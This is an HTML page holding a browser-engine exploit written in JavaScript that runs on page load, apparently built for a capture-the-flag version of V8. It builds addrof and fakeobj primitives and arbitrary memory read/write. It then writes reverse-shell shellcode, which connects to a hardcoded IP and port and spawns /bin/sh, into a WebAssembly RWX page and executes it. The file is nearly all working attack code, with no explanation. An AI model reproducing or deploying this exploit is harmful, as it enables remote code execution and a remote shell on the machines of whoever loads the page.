<html>
  <head>
    <script>
    	
function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}


function shrink_size(val) { 
	var t = ftoi(val);

	u64_buf[0] = Number(t & 0xffffff00n);
	u64_buf[0] = Number(t & 0xffffff02n);
    u64_buf[1] = Number(t >> 32n);
    return f64_buf[0];
}

function get_map_obj() {
	var leak = obj_arr.GetLastElement(); 
	leak = shrink_size(leak); // Shrinking size to 2
	obj_arr.SetLastElement(leak); // Now size is 2 and last element points to obj arr map

	var map = obj_arr.GetLastElement(); 
	return map;
}

function get_map_fl() {
	var map = fl_arr.GetLastElement();
	return map;
}


function adjust_maps() {
	var tmp_objmap = ftoi(map_obj);
	var tmp_flmap = ftoi(map_fl);

	u64_buf[0] = Number(tmp_objmap & 0xffffffffn);
    u64_buf[1] = Number(tmp_flmap & 0xffffffffn);
    map_fl_adj = f64_buf[0];

    u64_buf[0] = Number(tmp_objmap >> 32n);
    u64_buf[1] = Number(tmp_flmap >> 32n);
    map_obj_adj = f64_buf[0];
}


function addrof(in_obj) {
    obj_arr[0] = in_obj;
    obj_arr.SetLastElement(map_fl_adj);
    let addr = ftoi(obj_arr[0]);

    obj_arr.SetLastElement(map_obj);

    u64_buf[0] = Number(addr & 0xffffffffn);
	u64_buf[1] = Number(0x00n);								
	addr = f64_buf[0];

    return ftoi(addr);
}

function add_size(addr) {
	u64_buf[0] = Number(addr & 0xffffffffn);
	u64_buf[1] = Number(0x02n);								
	var ret = f64_buf[0];

    return ftoi(ret);
}


function fakeobj(addr) {
    fl_arr[0] = itof(addr);
    fl_arr.SetLastElement(map_obj_adj);
    let fake = fl_arr[0];

    fl_arr.SetLastElement(map_fl);

    return fake;
}

function arb_read(addr) {
    if (addr % 2n == 0)
		addr += 1n;

    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(BigInt(add_size(addr)) - 0x8n);

    return ftoi(fake[0]);
}

function arb_leak(addr) {
    if (addr % 2n == 0)
		addr += 1n;

    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(BigInt(addr) - 0x8n);

    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    arb_rw_arr[1] = itof(BigInt(add_size(addr)) - 0x8n);
    fake[0] = itof(BigInt(val));
}

function arb_write(addr, val) {
    var evil = new ArrayBuffer(8);
    var evil_data = new DataView(evil);
    var evil_addr = addrof(evil);
    var backing_store_addr = evil_addr + 0x14n;
    initial_arb_write(backing_store_addr, addr);
    evil_data.setBigUint64(0, BigInt(val), true);
}

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x14n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }


}

//8111
//var shellcode = [0x9958296a, 0x6a5f026a, 0x50f5e01, 0xb9489748, 0xaf1f0002, 0x120e0a0a, 0xe6894851, 0x6a5a106a, 0x50f582a, 0x485e036a, 0x216aceff, 0x75050f58, 0x583b6af6, 0x2fbb4899, 0x2f6e6962, 0x53006873, 0x52e78948, 0xe6894857, 0x50f];
var shellcode = [0x9958296a, 0x6a5f026a, 0x50f5e01, 0xb9489748, 0x39050002, 0xe0e0a0a, 0xe6894851, 0x6a5a106a, 0x50f582a, 0x485e036a, 0x216aceff, 0x75050f58, 0x583b6af6, 0x2fbb4899, 0x2f6e6962, 0x53006873, 0x52e78948, 0xe6894857, 0x50f];

var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
var temp_obj = {"A":1};
var obj_arr = [temp_obj, temp_obj, temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];

var map_obj = get_map_obj();
var map_fl = get_map_fl();
var map_obj_adj;
var map_fl_adj;

adjust_maps();

var arb_rw_arr = [map_fl, 1.2, 1.3, 1.4];


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x68n);

copy_shellcode(rwx_page_addr, shellcode);
f();


    </script>
  </head>
</html>
